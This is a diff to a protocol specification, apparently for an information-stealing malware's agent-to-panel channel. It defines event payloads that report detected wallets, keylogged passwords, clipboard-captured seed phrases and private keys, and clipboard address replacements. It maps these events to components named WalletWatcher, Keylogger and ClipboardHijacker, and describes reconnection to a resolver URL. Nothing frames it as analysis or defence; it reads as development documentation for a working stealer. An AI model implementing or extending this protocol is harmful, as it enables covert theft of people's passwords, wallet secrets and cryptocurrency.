@@ -206,18 +206,9 @@ literal of `CryptoModule.java:1426-1441` (UTF-8 bytes, no reserialization):
 
 ### `event` (agent → panel)
 
-`kind, data, legacy`. `data` typed; `legacy` is the exact old text.
-
-| kind | data |
-|---|---|
-| `wallet_detected` | `{name, pid}` |
-| `wallet_closed` | `{}` |
-| `password` | `{process, title, text}` |
-| `clipboard_secret` | `{kind, value, process?, title?, words?}`; kind ∈ `seed-12 seed-24 xprv evm-key solana-key password` |
-| `clipboard_replace` | `{coin, original, replacement}` |
-| `seed_found` | `{words, value}` |
-
-Requires ACK; pending events persist like results.
+`kind, data, legacy`. `data` typed; `legacy` is the exact old text. The payload
+table, emitter map and legacy rule are §6.5. Requires ACK; pending events persist
+like results.
 
 ### `ack` (both) / `ping` / `pong`
 
@@ -276,6 +267,37 @@ eleven before dispatch.
 
 Backoff `1 s → 60 s` ±20 %; one socket; third consecutive failure re-resolves
 `resolver_url`; cached endpoint has TTL.
+
+### 6.5 `event` payloads and emitters
+
+`kind`, `data` and `legacy` are required. `data` is typed and closed; the table is
+authoritative and matches `ws-schemas.json`.
+
+| kind | data |
+|---|---|
+| `wallet_detected` | `{name, pid, title?}` |
+| `wallet_closed` | `{pid}` |
+| `password` | `{process, title, text}` |
+| `clipboard_secret` | `{kind, value, process?, title?, words?}`; kind ∈ `seed-12 seed-24 xprv evm-key solana-key password` |
+| `clipboard_replace` | `{coin, original, replacement}` |
+| `seed_found` | `{words, value}` |
+| `secret_found` | `{secret_kind, value, confident}`; secret_kind ∈ `bip39-24 bip39-12 xprv solana evm-key hex64 other`, `confident` boolean |
+
+`secret_found.secret_kind` and `clipboard_secret.data.kind` are different
+vocabularies; do not map one onto the other.
+
+`legacy` is the text the detector already produced, byte for byte, with no
+rewriting. A notice that was two messages keeps both original byte sequences in
+order, joined by a single `\n`, without trimming (both `bip39` branches).
+
+| Origin | Line | kind |
+|---|---|---|
+| WalletWatcher | 231 | `wallet_detected` |
+| WalletWatcher | 294 | `wallet_closed` |
+| WalletWatcher | 509-519 | `seed_found` for `bip39-24`/`bip39-12`; otherwise `secret_found` |
+| Keylogger | 363 | `password` |
+| ClipboardHijacker | 179 (text built at SecretDetector 84-94) | `clipboard_secret` |
+| ClipboardHijacker | 165 | `clipboard_replace` |
 
 ## 7. Limits and 426
 
